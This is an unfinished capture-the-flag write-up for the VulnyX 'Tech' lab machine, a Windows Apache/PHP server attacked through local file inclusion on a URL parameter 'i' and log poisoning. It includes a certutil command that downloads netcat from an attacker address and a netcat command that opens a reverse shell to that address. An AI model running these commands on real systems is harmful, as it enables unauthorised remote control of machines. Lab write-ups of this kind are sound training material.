# WIP
# URL
https://vulnyx.com/vm/Tech/
# Concept
* local file inclusion (LFI)
* log poisoning
# Gotcha moment
* this LFI attack requires all of the payload string to be in lowercase, otherwise it doesn't work
  * this is an Apache server running PHP on Windows
# Method of solve
* there are a lot of standard Windows ports open on this machine, and also port 80
* on the webpage on port 80 there is a webpage that is loading in other pages via a URL parameter `i`
* so we have to test LFI using some fuzzing
* none of the standard Windows LFI payloads will work, because the web app doesn't accept capital letters in the directory paths
* Let's upload a netcat executable to the server and get it to give us a reverse shell.
```
certutil -urlcache -f http://192.168.200.6/nc.exe nc.exe
```
Then use this command to send the reverse shell
```
nc.exe 192.168.200.6 443 -e cmd
```











